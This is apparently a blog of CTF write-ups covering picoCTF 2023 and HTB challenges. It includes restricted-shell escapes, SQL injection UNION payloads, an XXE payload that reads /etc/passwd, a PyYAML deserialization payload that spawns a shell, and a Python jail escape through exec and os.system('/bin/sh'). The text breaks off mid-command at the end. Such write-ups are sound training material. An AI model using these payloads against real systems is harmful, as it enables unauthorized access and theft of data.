picoCTF{uS1ng_v1m_3dit0r_021d10ab} ~ ~ Repititions Can you make sense of this file? Download the file here.\nHere we are tasked with making sense of a file. Following the link prompts us to download a file called enc_flag. Enc is almost certainly shorthand for encoded, meaning our flag will probably need to go through some decoding processes.\n1 2 3 4 5 6 $ cat enc_flag VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVh RmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNk MlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVW VkpEVGxaYVdFMVhSbFZrTTBKVVZXcE9VazFXV2toT1dHUllDbUY2UWpSWk1GWlhWa2RHZEdWRlZs aGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg== Dumping the contents in plaintext, we can see that it is clearly not human-readable. A string such as this, ending with =, is very likely encoded with base64. We can use an online decoding tool such as CyberChef to get through this quickly, or we can use the linux command base64 to do this as well:\n1 2 3 4 5 $ cat enc_flag | base64 -d VjFSQ2EyTXlSblJUV0dSVllrWmFWRmx0TlZOalJtUlhZVVU1YVZKVVZuaFdWekZoWVZkR2NrNVVX bUZTVmtwUVdWUkdibVZXVm5WUgpiSEJzWVRCd2VWVXhXbXBOUlRWSFdqTnNWZ3BYUjFKeVZGZHdW MlZzVWxaVmJFNW9UVVJDTlZaWE1XRlVkM0JUVWpOUk1WWkhOWGRYCmF6QjRZMFZXVkdGdGVFVlhi bTkzVDFWT2JsQlVNRXNLCg== From our cat output we use | to redirect straight to another command, base64. Setting -d means the data will be base64 decoded. Despite this, the data is still unreadable. And we still see it ending in =? It appears the flag has been through multiple layers of encoding. We can decode for multiple rounds through the same method as before:\n1 2 $ cat enc_flag | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_492767d2} Finally after 6 rounds of decoding, the flag appears in plaintext.\nSpecial Don\u0026rsquo;t power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized\u0026hellip; automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That\u0026rsquo;s Special (TM) Start your instance to see connection details.\nAdditional details will be available after launching your challenge instance.\nWhen we first enter, we might be inclined to check what is in our home:\n1 2 3 Special$ ls Is sh: 1: Is: not found Our ls command is converted to Is, and then fails to execute. Checking a few other commands leads all syntax being altered to similar legitimate words, and all of them starting with capitilization. With our syntax ruined, we cannot execute commands properly! If we attempt to enter a different shell terminal, we receive an interesting rejection:\n1 2 Special$ bash Why go back to an inferior shell? My first thought is if my input is being altered after input but before bash processing, perhaps I can use characters designated to escaping metacharacter interpretation. In bash, the backslash \\ character is used to escape regular interpretations, and generally treats the character as raw text.\n1 2 3 Special$ \\ls Als sh: 1: Als: not found Unfortunately, trying to escape the l in ls, which was previously converted to I, produces something completely different. Trying again with other commands, I manage to execute whoami. Perhaps I am on to something?\n1 2 3 Special$ \\whoami \\whoami ctf-player As it stands currently, we are escaping only 1 character, but the others are still treated as regular components of a string. What if we escape every character?\n1 2 3 Special$ \\e\\c\\h\\o test \\e\\c\\h\\o test test We can successfully perform echo! However, for some strange reason ls is not working:\n1 2 3 Special$ \\l\\s Plus sh: 1: Plus: not found Perhaps the problem is caused by ls being only 2 characters? Regardless, we have other ways to look around:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Special$ \\d\\i\\r \\d\\i\\r blargh Special$ \\c\\a\\t \\b\\l\\a\\r\\g\\h \\c\\a\\t \\b\\l\\a\\r\\g\\h cat: blargh: Is a directory Special$ \\d\\i\\r \\b\\l\\a\\r\\g\\h \\d\\i\\r \\b\\l\\a\\r\\g\\h flag.txt Special$ \\c\\a\\t \\b\\l\\a\\r\\g\\h\\/\\f\\l\\a\\g\\.\\t\\x\\t \\c\\a\\t \\b\\l\\a\\r\\g\\h\\/\\f\\l\\a\\g\\.\\t\\x\\t picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6} While this approached works, it is rather tedious and ugly. We can escape this special shell by invoking bash:\n1 2 3 4 Special$ \\b\\a\\s\\h \\b\\a\\s\\h ctf-player@challenge:~$ whoami ctf-player Now we are free!\nSpecialer Reception of Special has been cool to say the least. That\u0026rsquo;s why we made an exclusive version of Special, called Secure Comprehensive Interface for Affecting Linux Empirically Rad, or just \u0026lsquo;Specialer\u0026rsquo;. With Specialer, we really tried to remove the distractions from using a shell. Yes, we took out spell checker because of everybody\u0026rsquo;s complaining. But we think you will be excited about our new, reduced feature set for keeping you focused on what needs it the most. Please start an instance to test your very own copy of Specialer.\nAdditional details will be available after launching your challenge instance.\nUpon entering, we might want to look around. However, we instantly come up with a problem:\n1 2 Specialer$ ls -bash: ls: command not found From the looks of it, ls is not accessible in our PATH. Specifying the full path does not help, and we soon find that we may not have access to any binaries:\n1 2 3 4 Specialer$ /usr/bin/ls -bash: /usr/bin/ls: No such file or directory Specialer$ locate ls -bash: locate: command not found Using tab auto-complete to navigate, we can see we are in a very restricted environment, and the only binary available is bash:\n1 2 3 Specialer$ cd / bin/ home/ lib/ lib64/ Specialer$ cd /bin/bash Note: Tabbing at / suggests bin, home, lib and lib64. Tabbing at /bin/ auto suggessts bash. This must be the only file in the directory.\nAt least with bash, we still have access to built-ins. Since our terminal commands are so limited, we can actually list them all by pressing tab twice on an empty line:\n1 2 3 4 5 6 7 8 9 10 11 12 Specialer$ ! builtin dirs exit history pushd suspend unalias ./ caller disown export if pwd test unset : case do false in read then until [ cd done fc jobs readarray time wait [[ command echo fg kill readonly times while ]] compgen elif fi let return trap { alias complete else for local select true } bash compopt enable function logout set type bg continue esac getopts mapfile shift typeset bind coproc eval hash popd shopt ulimit break declare exec help printf source umask We can utilize echo to see one directory layer at a time:\n1 2 3 4 5 Specialer$ echo * abra ala sim Specialer$ echo */* abra/cadabra.txt abra/cadaniel.txt ala/kazam.txt ala/mode.txt sim/city.txt sim/salabim.txt We have several txt files here to view, but unfortunately no common binary to read them with. Bash also comes with a read built-in, combined with echo, we can output contents within files\n1 2 Specialer$ read IFR \u0026lt; abra/cadabra.txt; echo $IFR Nothing up my sleeve! Now that the contents are displayed, perhaps one option can give us a flag?\n1 2 Specialer$ read IFR \u0026lt; ala/kazam.txt; echo $IFR return 0 picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_38f5cc78} Useless There\u0026rsquo;s an interesting script in the user\u0026rsquo;s home directory\nAdditional details will be available after launching your challenge instance.\nFor this challenge we are given a simple script, and told to explore the script to obtain the flag.\nFirstly, we are required to connect to the challenge machine via ssh:\n1 $ ssh picoplayer@saturn.picoctf.net -p PORT The port number is customized to your own launched instances.\nwe see the script in our home directory, with executable premissions:\n1 2 3 4 5 6 7 8 9 picoplayer@challenge:~$ ls -al total 16 drwxr-xr-x 1 picoplayer picoplayer 20 Mar 17 18:38 . drwxr-xr-x 1 root root 24 Mar 16 02:30 .. -rw-r--r-- 1 picoplayer picoplayer 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 picoplayer picoplayer 3771 Feb 25 2020 .bashrc drwx------ 2 picoplayer picoplayer 34 Mar 17 18:38 .cache -rw-r--r-- 1 picoplayer picoplayer 807 Feb 25 2020 .profile -rwxr-xr-x 1 root root 517 Mar 16 01:30 useless First, we check the kind of file we are working with:\n1 2 picoplayer@challenge:~$ file useless useless: Bourne-Again shell script, ASCII text executable This is a bash script, written in plaintext. We will be able to easily view the contents with a simple cat command:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 picoplayer@challenge:~$ cat useless #!/bin/bash # Basic mathematical operations via command-line arguments if [ $# != 3 ] then echo \u0026#34;Read the code first\u0026#34; else if [[ \u0026#34;$1\u0026#34; == \u0026#34;add\u0026#34; ]] then sum=$(( $2 + $3 )) echo \u0026#34;The Sum is: $sum\u0026#34; elif [[ \u0026#34;$1\u0026#34; == \u0026#34;sub\u0026#34; ]] then sub=$(( $2 - $3 )) echo \u0026#34;The Substract is: $sub\u0026#34; elif [[ \u0026#34;$1\u0026#34; == \u0026#34;div\u0026#34; ]] then div=$(( $2 / $3 )) echo \u0026#34;The quotient is: $div\u0026#34; elif [[ \u0026#34;$1\u0026#34; == \u0026#34;mul\u0026#34; ]] then mul=$(( $2 * $3 )) echo \u0026#34;The product is: $mul\u0026#34; else echo \u0026#34;Read the manual\u0026#34; fi fi It appears the script is performing basic math, based on whatever operation you tell it to perform. For example, a division problem\n1 2 picoplayer@challenge:~$ ./useless div 10 2 The quotient is: 5 If we don\u0026rsquo;t supply 3 arguments, we are told to read the code. If we don\u0026rsquo;t supply a valid math operation, we are told to read the manual. There is not much to go on with this program here. We can see if a manual exists for this by using man:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 man useless useless useless, -- This is a simple calculator script SYNOPSIS useless, [add sub mul div] number1 number2 DESCRIPTION Use the useless, macro to make simple calulations like addition,subtraction, multi- plication and division. Examples ./useless add 1 2 This will add 1 and 2 and return 3 ./useless mul 2 3 This will return 6 as a product of 2 and 3 ./useless div 6 3 This will return 2 as a quotient of 6 and 3 ./useless sub 6 5 This will return 1 as a remainder of substraction of 5 from 6 Authors This script was designed and developed by Cylab Africa picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_5562} Turns out a man page exists, and our flag was placed here as well. Great..\nWeb findme Help us test the form by submiting the username as test and password as test! The website running here\nUpon logging in, we cycle through a couple blank pages very quickly before landing at http://saturn.picoctf.net:54197/home. The page contains a search bar and a small note: \u0026ldquo;I was redirected here by a friend of mine but i couldnt find anything. Help me search for flags :-)\u0026rdquo;\nSearching for a few keywords leads us to no result. The note on this page mentions the redirects as well, so let\u0026rsquo;s use burpsuite to catch and analyze each step that\u0026rsquo;s occuring. First login request:\nFirst redirect:\nSecond redirect:\nThen finally we are sent to home. There isn\u0026rsquo;t much to go on aside from the second redirect has an id value that looks like base64 encoding. Decoding the string:\n1 2 $ echo \u0026#34;bF90aGVfd2F5XzAxZTc0OGRifQ==\u0026#34; | base64 -d l_the_way_01e748db} This is looking like half of a flag. Combining the two id values together and base64 decoding might get us the flag:\n1 2 echo \u0026#34;cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5XzAxZTc0OGRifQ==\u0026#34; | base64 -d picoCTF{proxies_all_the_way_01e748db} MatchTheRegex How about trying to match a regular expression The website is running here.\nGoing to the page, we see an input box to input our search. Based on the name, my first thought is that this will be a regular expression search, where we must input a regex term that will hit positive for specifically the flag. After trying several different regex queries, I\u0026rsquo;m not having any luck. Looking at the page source, I notice a hint displayed in comments:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; function send_request() { let val = document.getElementById(\u0026#34;name\u0026#34;).value; // ^p.....F!? fetch(`/flag?input=${val}`) .then(res =\u0026gt; res.text()) .then(res =\u0026gt; { const res_json = JSON.parse(res); alert(res_json.flag) return false; }) return false; } \u0026lt;/script\u0026gt; ^p.....F!? In regex searches, ^ refers to the start of a line and $ refers to the end of a line, so perhaps this hint can be a working query?\nUnfortunately not.. Playing with the provided hint a little more, I get a successful match by being more generic:\nDespite being a regex based search, and the commented page source including the ^ marker for the beginning of a line, including the ^ in our search causes it to fail.. picoCTF{succ3ssfully_matchtheregex_f89ea585}\nMore_SQLi Can you find the flag on this website. Try to find the flag here\nThanks to sergyperov for the helpful writeup!\nEntering the site we see a login page. Considering the name of the challenge, we will start with a simple SQL injection payload: 'or 1=1-- On the first attempt with a random input, we get an error. This is more useful than usual, however, as it tells us the SQL query happening in the background:\n1 2 3 username: \u0026#39;or 1=1-- password: 345534 SQL query: SELECT id FROM users WHERE password = \u0026#39;345534\u0026#39; AND username = \u0026#39;\u0026#39;or 1=1-- \u0026#39; Since password is being called first, we can insert our injection into this field and it should work. After bypassing login, we see a table of information:\nThere\u0026rsquo;s no flag here, but one of the addresses seems to be a little interesting: \u0026ldquo;Maybe all the tables\u0026rdquo;. Doing our regular SQL injection 'or 1=1-- in the search bar results in the same information. It appears that although we are dumping all information from the current table, the flag is actually in a different table? In order to dump information in other tables we will look into UNION injections.\nFirst to explore union injections, we need to know the number of columns in this table. With this challenge, we can clearly see three tables, but just to be sure, we will check a UNION injection including 3 columns. If the column number doesn\u0026rsquo;t match the SQL query, the search will fail.\n1 Kampala\u0026#39; UNION SELECT NULL,NULL,NULL-- Note that choosing Kampala to search isn\u0026rsquo;t required, but it can make it easier to see our row of NULLs between it and the City/Address/Phone header.\nFrom here, we need to know which columns might be text injectable. Since city and address contain strings, these two are likely, however phone consists of numbers so possibly not the third column. Testing all 3 at once:\n1 Kampala\u0026#39; UNION SELECT \u0026#34;abc\u0026#34;,\u0026#34;abc\u0026#34;,\u0026#34;abc\u0026#34;-- All three columns return our injected string, meaning we can dump information out of any of these three columns. Note you only need one column working to proceed with union injection, and also if you try injecting your string into a column that cannot take string values then the entire SQL query fails.\nProbing the SQL tables:\n1 Kampala\u0026#39; UNION SELECT sql,NULL,NULL from sqlite_master LIMIT 1,5; -- by pulling sql from sqlite_master, we can see a total of 4 tables:\nhints more_table offices users Normally users would be the most interesting for us, but our hint about \u0026ldquo;Maybe all the tables\u0026rdquo; is hinting towards the more_tables table first. We can check each table by using the same type of UNION injection. Note that this table list output also gives us the column names: id and flag. Another reason to try this table first.\n1 Kampala\u0026#39; UNION SELECT id,flag,NULL from more_table where 1=1-- And with that, we have our flag. picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}\nSOAP The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? Web Portal\nVisiting the page we 3 cards, each with an interactable Details button:\nWhen we watch Firefox\u0026rsquo;s Network Monitor and click a detail, we see a post method sent:\nThe request payload is in xml format, potentially leading to XXE (XML external entity) injection. We can try a simple payload described in portswigger\u0026rsquo;s post on the topic:\n1 `\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;stockCheck\u0026gt;\u0026lt;productId\u0026gt;\u0026amp;xxe;\u0026lt;/productId\u0026gt;\u0026lt;/stockCheck\u0026gt;` modifying our own payload:\n1 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY abc SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt;\u0026lt;data\u0026gt;\u0026lt;ID\u0026gt;\u0026amp;abc;\u0026lt;/ID\u0026gt;\u0026lt;/data\u0026gt; We can resend our request using Firefox\u0026rsquo;s Network Manager again, and replace the body contents with our newly modified payload. In the response tab, we see the contents of /etc/passwd as well as our flag:\npicoCTF{XML_3xtern@l_3nt1t1ty_55662c16}\nIn an interesting twist of annoyance, the xxe injection fails if you use the entity term \u0026lsquo;xxe\u0026rsquo;, as is done in portswigger\u0026rsquo;s example. After renaming the entity to \u0026lsquo;abc\u0026rsquo;, the xxe exploit worked effortlessly.\n","date":"2023-03-28T21:15:25-05:00","permalink":"https://yuwenmichael.netlify.app/post/picoctf_2023/","title":"PicoCTF_2023"},{"content":"Forensics Extraterrestrial Persistence There is a rumor that aliens have developed a persistence mechanism that is impossible to detect. After investigating her recently compromised Linux server, Pandora found a possible sample of this mechanism. Can you analyze it and find out how they install their persistence? Difficulty: very easy\nFor this challenge we are provided with a small persistence.sh script. Within the code, we see base64 encoded information being directed to a file service.service, then being called:\n1 2 3 echo -e \u0026#34;W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA==\u0026#34;|base64 --decode \u0026gt; /usr/lib/systemd/system/service.service systemctl enable service.service We can decode this base64 ourselves and have a better idea on what is being done\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ echo -e \u0026#34;W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA==\u0026#34;|base64 --decode [Unit] Description=HTB{th3s3_4l13nS_4r3_s00000_b4s1c} After=network.target network-online.target [Service] Type=oneshot RemainAfterExit=yes ExecStart=/usr/local/bin/service ExecStop=/usr/local/bin/service [Install] WantedBy=multi-user.target Just like that, we find the flag: HTB{th3s3_4l13nS_4r3_s00000_b4s1c}\nMisc Hijack The security of the alien spacecrafts did not prove very robust, and you have gained access to an interface allowing you to upload a new configuration to their ship\u0026rsquo;s Thermal Control System. Can you take advantage of the situation without raising any suspicion? Difficulty: easy\nWe are given an IP address and port to nc into:\n1 nc 159.65.94.38 30109 Upon connection, we are greeted with a simple menu system:\n1 2 3 4 \u0026lt;------[TCS]------\u0026gt; [1] Create config [2] Load config [3] Exit Trying to create a config, we see very few input checks in place:\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026gt; 1 - Creating new config - Temperature units (F/C/K): A Propulsion Components Target Temperature : B Solar Array Target Temperature : C Infrared Spectrometers Target Temperature : D Auto Calibration (ON/OFF) : E Serialized config: ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6IEQsIGF1dG9fY2FsaWJyYXRpb246IEUsIHByb3B1bHNpb25fdGVtcDogQiwKICBzb2xhcl9hcnJheV90ZW1wOiBDLCB1bml0czogQX0K Uploading to ship... The returned serialized config looks to be base64 encoded, so let\u0026rsquo;s see what this contains:\n1 2 3 $ echo \u0026#34;ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6IEQsIGF1dG9fY2FsaWJyYXRpb246IEUsIHByb3B1bHNpb25fdGVtcDogQiwKICBzb2xhcl9hcnJheV90ZW1wOiBDLCB1bml0czogQX0K\u0026#34; | base64 -d !!python/object:__main__.Config {IR_spectrometer_temp: D, auto_calibration: E, propulsion_temp: B, solar_array_temp: C, units: A} It looks like our config options that we created. However, loading this config fails even though creation was successful. A quick google search indicates that this !!python/object:__main__ syntax is from PyYAML. There is a page on hacktricks that details how one might go about exploiting this: https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization\nUnder RCE category, we see it might be possible to execute shell command with the right syntax. Testing the exploit:\n1 2 3 $ echo \u0026#39;!!python/object/apply:subprocess.Popen - ls\u0026#39; | base64 ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBscwo= Loading base64 config:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;------[TCS]------\u0026gt; [1] Create config [2] Load config [3] Exit \u0026gt; 2 Serialized config to load: ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBscwo= ** Success ** Uploading to ship... \u0026lt;------[TCS]------\u0026gt; [1] Create config [2] Load config [3] Exit \u0026gt; chall.py flag.txt hijack.py ls is successfully executing! Now to read the flag.\nI had some trouble producing a payload that would simply cat the flag.txt file. Presumably, my payload setup was not suitable for a command with several words (cat flag.txt), so to work around this I simply spawned a shell:\n1 2 !!python/object/apply:subprocess.Popen - sh 1 2 $ cat payload | base64 ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBzaAo= 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;------[TCS]------\u0026gt; [1] Create config [2] Load config [3] Exit \u0026gt; 2 Serialized config to load: ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBzaAo= ** Success ** Uploading to ship... \u0026lt;------[TCS]------\u0026gt; [1] Create config [2] Load config [3] Exit \u0026gt; cat flag.txt HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?} HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}\nJanken As you approach an ancient tomb, you\u0026rsquo;re met with a wise guru who guards its entrance. In order to proceed, he challenges you to a game of Janken, a variation of rock paper scissors with a unique twist. But there\u0026rsquo;s a catch: you must win 100 rounds in a row to pass. Fail to do so, and you\u0026rsquo;ll be denied entry. Difficulty: easy\nIn this challenge we are given a compiled binary called janken. Upon running it, we can view the rules for the game:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ ./janken ▛▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▜ ▌ じ ゃ ん 拳 ▐ ▙▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▟ 1. ℙ ∟ ₳ Ұ 2. ℜ ℧ ∟ Ӗ ⅀ \u0026gt;\u0026gt; 2 ▛▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▜ ▚ [*] Rock is called \u0026#34;Guu\u0026#34; (ぐう). ▞ ▞ [*] Scissors is called \u0026#34;Choki\u0026#34; (ちょき). ▚ ▚ [*] Paper is called \u0026#34;Paa\u0026#34; (ぱあ). ▞ ▞ ▚ ▚ 1. Rock \u0026gt; scissors, scissors \u0026gt; paper, paper \u0026gt; rock. ▞ ▞ 2. You have to win [100] times in a row in order to get the prize. 🏆 ▚ ▙▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▟ To win, we must win 100 games of rock paper scissors in a row. If left up to chance, this is not realistic. There must be a way to force a win. I recall seeing this same problem presented in another CTF competition, picoCTF 2022. (RPS in Binary Exploitation category). In that challenge, the win condition was only checking if the player\u0026rsquo;s input contained the winning string. So, by playing all 3 options at once you were guaranteed to win. We can try that here as well:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026gt;\u0026gt; 1 [!] Let the game begin! 🎉 [*] Round [1]: Choose: Rock 👊 Scissors ✂ Paper 📜 \u0026gt;\u0026gt; rock,paper,scissors [!] Guru\u0026#39;s choice: scissors [!] Your choice: rock,paper,scissors [+] You won this round! Congrats! [*] Round [2]: The syntax was a little picky, but we see a guaranteed winning combination with rock,paper,scissors.\nWriting out rock,paper,scissors 100 times in a row is boring and tedious, so I channeled my inner programmer and spent twice as long making a script that will do it for me:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from pwn import * p = remote(\u0026#39;178.62.64.13\u0026#39;, 31174) win = \u0026#39;rock,paper,scissors\u0026#39; #Start game 1 and chain p.sendline(\u0026#39;1\u0026#39;) #Looping sendline is too fast, so I wait for interactive marker \u0026gt;\u0026gt; for i in range(100): p.sendlineafter(\u0026#39;\u0026gt;\u0026gt;\u0026#39;,win) response = p.recvallS() print(response) Now to acquire the flag in extra speedy fashion:\n1 2 3 4 5 6 7 8 9 10 $ python RPS.py [+] Opening connection to 178.62.64.13 on port 31174: Done [+] Receiving all data: Done (223B) [*] Closed connection to 178.62.64.13 port 31174 [!] Guru\u0026#39;s choice: rock [!] Your choice: rock,paper,scissors [+] You won this round! Congrats! [+] You are worthy! Here is your prize: HTB{r0ck_p4p3R_5tr5tr_l0g1c_buG} HTB{r0ck_p4p3R_5tr5tr_l0g1c_buG}\nNehebkaus Trap In search of the ancient relic, you go looking for the Pharaoh\u0026rsquo;s tomb inside the pyramids. A giant granite block falls and blocks your exit, and the walls start closing in! You are trapped. Can you make it out alive and continue your quest? Difficulty: medium\nConnecting to the nc link, we find that it\u0026rsquo;s a trap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 nc 104.248.169.117 32684 __ {00} \\__/ /^/ ( ( \\_\\_____ (_______) (_________()Ooo. [ Nehebkau\u0026#39;s Trap ] You are trapped! Can you escape? \u0026gt; Various shell commands do not work, and we quickly find that several critical inputs are blacklisted, such as single and double quotes, or dots. The snake is our first subtle hint, we are likely trapped in a python jail! There is a posting on hacktricks that covers this type of problem. Unfortunately, most of the suggestions will not work for us with restrictions on dot, quotes, space and even uderscores. We can, however, print the globals and locals:\n1 2 3 4 5 6 7 8 9 10 11 \u0026gt; print(globals()) [*] Input accepted! {\u0026#39;__name__\u0026#39;: \u0026#39;__main__\u0026#39;, \u0026#39;__doc__\u0026#39;: None, \u0026#39;__package__\u0026#39;: None, \u0026#39;__loader__\u0026#39;: \u0026lt;_frozen_importlib_external.SourceFileLoader object at 0x7f37eeb47c10\u0026gt;, \u0026#39;__spec__\u0026#39;: None, \u0026#39;__annotations__\u0026#39;: {}, \u0026#39;__builtins__\u0026#39;: \u0026lt;module \u0026#39;builtins\u0026#39; (built-in)\u0026gt;, \u0026#39;__file__\u0026#39;: \u0026#39;/home/ctf/./jail.py\u0026#39;, \u0026#39;__cached__\u0026#39;: None, \u0026#39;sys\u0026#39;: \u0026lt;module \u0026#39;sys\u0026#39; (built-in)\u0026gt;, \u0026#39;time\u0026#39;: \u0026lt;module \u0026#39;time\u0026#39; (built-in)\u0026gt;, \u0026#39;BLACKLIST\u0026#39;: (\u0026#39;.\u0026#39;, \u0026#39;_\u0026#39;, \u0026#39;/\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39; \u0026#39;, \u0026#34;\u0026#39;\u0026#34;, \u0026#39;,\u0026#39;), \u0026#39;Color\u0026#39;: \u0026lt;class \u0026#39;__main__.Color\u0026#39;\u0026gt;, \u0026#39;_print\u0026#39;: \u0026lt;function _print at 0x7f37eeba3d90\u0026gt;, \u0026#39;banner\u0026#39;: \u0026lt;function banner at 0x7f37eeae2c20\u0026gt;, \u0026#39;loop\u0026#39;: \u0026lt;function loop at 0x7f37eeae2cb0\u0026gt;, \u0026#39;_\u0026#39;: 2} \u0026gt; print(locals()) [*] Input accepted! {\u0026#39;banned\u0026#39;: [], \u0026#39;inp\u0026#39;: \u0026#39;print(locals())\u0026#39;} If it wasn\u0026rsquo;t found through trial and error yet, we can see the full list of blacklisted characters here:\n1 BLACKLIST\u0026#39;: (\u0026#39;.\u0026#39;, \u0026#39;_\u0026#39;, \u0026#39;/\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39; \u0026#39;, \u0026#34;\u0026#39;\u0026#34;, \u0026#39;,\u0026#39;) Under globals we find builtins is present. We must rely on these builtin functions to escape the jail and find our flag. A list of builtin functions can be found here. Input() caught my eye, as perhaps we can supply stdin that might not be checked through the blacklist:\n1 2 3 4 5 \u0026gt; a=input() [*] Input accepted! Error: invalid syntax (\u0026lt;string\u0026gt;, line 1) Unfortunately, I received an error before being able to input anything for variable declaration. However, trying input() on its own seems to work as I expected:\n1 2 3 4 5 6 \u0026gt; input() [*] Input accepted! \u0026#39;\u0026#34;\u0026#39;\u0026#34;Test aWE$% \u0026gt; Here we see no blacklist notice despite putting several blacklisted characters. Perhaps we can use input in a different way? Next I tried input in combination with exec:\n1 2 3 4 5 6 7 \u0026gt; exec(input()) [*] Input accepted! print(\u0026#34;This is a test.\u0026#34;) This is a test. \u0026gt; The print worked, and again no notice on blacklisted functions. From here there are several ways to read a flag. Since I wasn\u0026rsquo;t sure what the flag was named or where it might be, I decided to create a shell session using a gtfobins payload:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026gt; exec(input()) [*] Input accepted! import os; os.system(\u0026#34;/bin/sh\u0026#34;) whoami ctf ls flag.txt jail.py cat flag.txt HTB{y0u_d3f34t3d_th3_sn4k3_g0d!} HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}\nPersistence Thousands of years ago, sending a GET request to /flag would grant immense power and wisdom. Now it\u0026rsquo;s broken and usually returns random data, but keep trying, and you might get lucky\u0026hellip; Legends say it works once every 1000 tries. Difficulty: very easy\nThe objective for this problem is very straightforward: send a /GET request to IP:PORT/flag and you will receive the flag after ~1000 attempts. 1000 attempts is a rather high number to reach manually, so creating a loop for curl is the way to go:\n1 2 3 4 5 #!/bin/bash for i in {1..1000} do curl -s 